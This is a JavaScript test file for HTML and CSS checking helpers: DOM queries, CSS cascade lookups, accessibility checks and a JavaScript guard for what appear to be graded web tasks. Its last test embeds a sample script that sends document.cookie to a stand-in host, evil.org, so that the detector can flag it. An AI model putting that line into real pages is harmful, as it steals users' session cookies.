import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  queryAll,
  attr,
  text,
  cssRules,
  cssValue,
  checkImagesHaveAlt,
  assertImagesHaveAlt,
  checkInputsHaveLabels,
  assertInputsHaveLabels,
  checkHeadingsInOrder,
  assertHeadingsInOrder,
} from '../src/lib/code/web/htmlCssChecks';
import { findForbiddenJs } from '../src/lib/code/js/jsGuard';

describe('HTML and CSS checks (CHK-4 / W-05)', () => {
  describe('DOM query and attribute helpers', () => {
    const sampleHtml = `
      <div id="wrapper" class="container dark-theme">
        <header>
          <h1 class="main-title">PinIT Career OS</h1>
          <nav>
            <a href="/dashboard" class="nav-link active">Dashboard</a>
            <a href="/profile" class="nav-link">Profile</a>
          </nav>
        </header>
        <main>
          <article class="card">
            <h2>Welcome</h2>
            <p>Empowering student careers with AI.</p>
          </article>
        </main>
      </div>
    `;

    it('queries elements by tag, class, id, and descendant combinators', () => {
      const links = queryAll(sampleHtml, 'a');
      assert.strictEqual(links.length, 2);

      const navLinks = queryAll(sampleHtml, '.nav-link');
      assert.strictEqual(navLinks.length, 2);

      const wrapper = queryAll(sampleHtml, '#wrapper');
      assert.strictEqual(wrapper.length, 1);

      const headerTitle = queryAll(sampleHtml, 'header .main-title');
      assert.strictEqual(headerTitle.length, 1);

      const cardHeadings = queryAll(sampleHtml, '.card h2');
      assert.strictEqual(cardHeadings.length, 1);
    });

    it('extracts attributes and text content correctly', () => {
      const title = queryAll(sampleHtml, 'h1')[0];
      assert.strictEqual(attr(title, 'class'), 'main-title');
      assert.strictEqual(text(title).trim(), 'PinIT Career OS');

      const activeLink = queryAll(sampleHtml, 'a.active')[0];
      assert.strictEqual(attr(activeLink, 'href'), '/dashboard');
      assert.strictEqual(text(activeLink).trim(), 'Dashboard');
    });
  });

  describe('CSS parser and inspection helpers', () => {
    const sampleCss = `
      .card {
        border-radius: 8px;
        padding: 16px;
        background-color: #ffffff;
      }
      .card:hover {
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      }
      h1, h2 {
        font-family: 'Inter', sans-serif;
        color: #111827;
      }
      /* Cascade test */
      .card {
        padding: 24px;
      }
    `;

    it('reads all rules and declarations', () => {
      const rules = cssRules(sampleCss);
      assert.ok(rules.length >= 3);
      assert.ok(rules.some((r) => r.selector === '.card'));
      assert.ok(rules.some((r) => r.selector === 'h1, h2'));
    });

    it('reads CSS values obeying the CSS cascade order', () => {
      const borderRadius = cssValue(sampleCss, '.card', 'border-radius');
      assert.strictEqual(borderRadius, '8px');

      // The second .card rule declared padding: 24px, which should win over 16px
      const padding = cssValue(sampleCss, '.card', 'padding');
      assert.strictEqual(padding, '24px');

      const color = cssValue(sampleCss, 'h1, h2', 'color');
      assert.strictEqual(color, '#111827');

      const nonExistent = cssValue(sampleCss, '.card', 'display');
      assert.strictEqual(nonExistent, null);
    });
  });

  describe('Accessibility helpers', () => {
    it('detects missing alt attribute on images', () => {
      const passingHtml = `
        <div>
          <img src="/avatar.jpg" alt="Student profile avatar" />
          <img src="/decorative.svg" alt="" />
        </div>
      `;
      const passResult = checkImagesHaveAlt(passingHtml);
      assert.strictEqual(passResult.ok, true);
      assert.doesNotThrow(() => assertImagesHaveAlt(passingHtml));

      const failingHtml = `
        <div>
          <img src="/avatar.jpg" alt="Profile" />
          <img src="/logo.png" />
        </div>
      `;
      const failResult = checkImagesHaveAlt(failingHtml);
      assert.strictEqual(failResult.ok, false);
      assert.strictEqual(failResult.missingCount, 1);
      assert.throws(() => assertImagesHaveAlt(failingHtml), /alt attribute/);
    });

    it('detects unlabelled form inputs', () => {
      const passingHtml = `
        <form>
          <label for="username">Username</label>
          <input id="username" type="text" />
          <label>
            Password
            <input type="password" />
          </label>
          <input type="text" aria-label="Search site" />
          <input type="hidden" name="csrf" value="token" />
        </form>
      `;
      const passResult = checkInputsHaveLabels(passingHtml);
      assert.strictEqual(passResult.ok, true);
      assert.doesNotThrow(() => assertInputsHaveLabels(passingHtml));

      const failingHtml = `
        <form>
          <input id="email" type="email" placeholder="Enter email" />
        </form>
      `;
      const failResult = checkInputsHaveLabels(failingHtml);
      assert.strictEqual(failResult.ok, false);
      assert.strictEqual(failResult.unlabelledCount, 1);
      assert.throws(() => assertInputsHaveLabels(failingHtml), /accessible label/);
    });

    it('detects headings that skip hierarchical levels', () => {
      const passingHtml = `
        <main>
          <h1>Top Level Title</h1>
          <h2>Section One</h2>
          <h3>Sub-section A</h3>
          <h2>Section Two</h2>
          <h3>Sub-section B</h3>
        </main>
      `;
      const passResult = checkHeadingsInOrder(passingHtml);
      assert.strictEqual(passResult.ok, true);
      assert.doesNotThrow(() => assertHeadingsInOrder(passingHtml));

      const failingHtml = `
        <main>
          <h1>Top Level Title</h1>
          <h3>Skipped directly to H3 without H2</h3>
        </main>
      `;
      const failResult = checkHeadingsInOrder(failingHtml);
      assert.strictEqual(failResult.ok, false);
      assert.ok(failResult.violations[0].includes('skipped to <h3'));
      assert.throws(() => assertHeadingsInOrder(failingHtml), /Heading levels/);
    });

    it('blocks cheat attempts containing forbidden JavaScript in HTML/CSS tasks', () => {
      const maliciousHtmlWithScript = `
        <div>Safe HTML</div>
        <script>
          fetch("https://evil.org/steal?cookie=" + document.cookie);
        </script>
      `;

      const detected = findForbiddenJs(maliciousHtmlWithScript);
      assert.strictEqual(detected, 'fetch');
    });
  });
});
